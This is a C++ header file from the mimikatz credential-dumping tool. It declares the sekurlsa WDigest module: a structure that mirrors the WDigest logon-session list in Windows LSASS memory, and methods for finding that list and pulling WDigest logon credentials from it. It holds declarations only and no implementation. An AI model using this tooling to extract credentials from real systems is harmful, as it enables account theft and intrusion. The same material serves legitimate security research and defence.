/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence    : http://creativecommons.org/licenses/by/3.0/fr/
	Ce fichier : http://creativecommons.org/licenses/by/3.0/fr/
*/
#pragma once
#include "../mod_mimikatz_sekurlsa.h"

class mod_mimikatz_sekurlsa_wdigest {

private:
	typedef struct _KIWI_WDIGEST_LIST_ENTRY {
		struct _KIWI_WDIGEST_LIST_ENTRY *Flink;
		struct _KIWI_WDIGEST_LIST_ENTRY *Blink;
		DWORD	UsageCount;
		struct _KIWI_WDIGEST_LIST_ENTRY *This;
		LUID LocallyUniqueIdentifier;
	} KIWI_WDIGEST_LIST_ENTRY, *PKIWI_WDIGEST_LIST_ENTRY;

	static PKIWI_WDIGEST_LIST_ENTRY l_LogSessList;
	static long offsetWDigestPrimary;
	static bool searchWDigestEntryList();

public:
	static mod_process::PKIWI_VERY_BASIC_MODULEENTRY pModWDIGEST;
	static bool getWDigest(vector<wstring> * arguments);
	static bool WINAPI getWDigestLogonData(__in PLUID logId, __in bool justSecurity);
};